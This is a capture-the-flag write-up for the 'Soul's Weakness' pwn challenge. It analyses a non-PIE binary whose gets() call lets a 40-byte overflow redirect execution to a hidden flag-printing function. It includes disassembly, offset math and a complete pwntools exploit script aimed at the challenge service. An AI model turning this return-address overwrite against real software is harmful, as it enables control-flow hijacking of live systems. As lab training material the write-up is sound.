---
title: "Soul's Weakness"
category: "Pwn"
tags: ["stack-buffer-overflow", "gets", "unreachable-win-function", "non-pie"]
solve_date: "2026-10-09"
language: "en"
---

# Soul's Weakness

**Flag:** `OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}`
**Service:** `145.239.142.129:1337`. **Artifact:** `soul-stone.zip` (2860 B), containing `soul` (16288 B, 64-bit ELF).

## Challenge

The `soul` binary is provided and runs on port 1337 (Easy, 24 solves at the time of the solve). The program greets the user through `gets()` and then reports that the Soul Stone remains sealed. A `soul_stone()` function that prints the flag exists in the binary but is not on the normal execution path; the goal is to reach it.

## Analysis

`r2 -q -c "iI~type,pic" soul` reports `type EXEC` and `pic false`: the image load address is fixed and no leak step is needed.

`main()` only calls `setvbuf` three times and then `call sym.vault`. Cross-references to `sym.soul_stone` are empty (`aa; axt @ sym.soul_stone` prints no xref), so `soul_stone()` at `0x4011b6` is never reached on the normal path:

```text
0x004011be  lea rax, str._n___Soul_Stone_unlocked_ ; 0x402008 ; "\n[+] Soul Stone unlocked!"
0x004011c8  call sym.imp.puts
0x004011cd  lea rax, str.OWASPS0ul_St0ne_Buff3r_0v3rfl0w ; 0x402028
0x004011d7  call sym.imp.puts
0x004011e6  call sym.imp.fflush
0x004011ed  ret
```

`vault()` at `0x4011ee` builds the frame and reads the name:

```text
0x004011f6  4883ec20     sub rsp, 0x20
0x0040124a  488d45e0     lea rax, [rbp - 0x20]
0x00401256  e845feffff   call sym.imp.gets
```

The buffer is at `rbp-0x20` and the return address at `rbp+8`, so 0x20 + 8 = 40 bytes are needed to reach the overwrite point. `gets()` performs no length check.

The flag literal also exists statically in `.rodata`, so the file alone is not enough to conclude anything:

```text
1   0x00002028 0x00402028 33  34   .rodata ascii OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}
```

It is the service response after exploitation that establishes this string as the challenge flag.

## Solution

The payload is 40 filler bytes plus the little-endian address of `soul_stone()` (48 bytes of overwrite), sent with `sendline()` so a trailing `\n` terminates `gets()`:

```python
SOUL = 0x4011b6
OFFSET = 0x20 + 8  # buffer (rbp-0x20) + saved rbp -> return address
payload = b'A' * OFFSET + p64(SOUL)
```

After `gets()` returns, `vault()` prints `Hello, %s!` and the line `The Soul Stone remains sealed...`, then `pop rbp` / `ret` jumps to `0x4011b6` instead of back to `main()`. `soul_stone()` prints `Soul Stone unlocked!` and the flag line, calls `fflush(stdout)` and then `ret` into a corrupted stack — the flag has already been printed, so this does not affect the outcome.

The three bytes `b6 11 40` of the address reappear in the greeting because `%s` prints up to the first NUL; the high part of the address is `00` bytes, as expected for a non-PIE image. Recorded session response (the run of `A`s is abbreviated in the log line):

```text
[+] Response: b'\nHello, AAA…\xb6\x11@!\nThe Soul Stone remains sealed...\n\n[+] Soul Stone unlocked!\nOWASP{S0ul_St0ne_Buff3r_0v3rfl0w}\n'
```

## Result

```text
OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}
```

The flag was read directly from the challenge service. No submission response recorded.

## Reproduce

Requires Python 3 and pwntools (the solving session used pwntools 4.15.0).

```console
$ unzip soul-stone.zip
$ r2 -q -c "iI~type,pic" soul
$ r2 -q -c "aa; axt @ sym.soul_stone; iz~OWASP" soul
```

Save the block below as `exploit.py` and run `python exploit.py` against `145.239.142.129:1337`:

```python
from pwn import *

context.log_level = 'debug'
context.timeout = 25

SOUL = 0x4011b6
OFFSET = 0x20 + 8  # buffer (rbp-0x20) + saved rbp -> return address

HOST, PORT = '145.239.142.129', 1337

io = remote(HOST, PORT)
io.recvuntil(b'Enter your name: ')
payload = b'A' * OFFSET + p64(SOUL)
io.sendline(payload)
data = io.recvall(timeout=15)
log.success('Response: %r' % (data,))
io.close()
```

The offset 40 and the address `0x4011b6` come from the shipped `soul`; re-check `sub rsp` and `lea rax,[rbp-…]` if the binary changes.
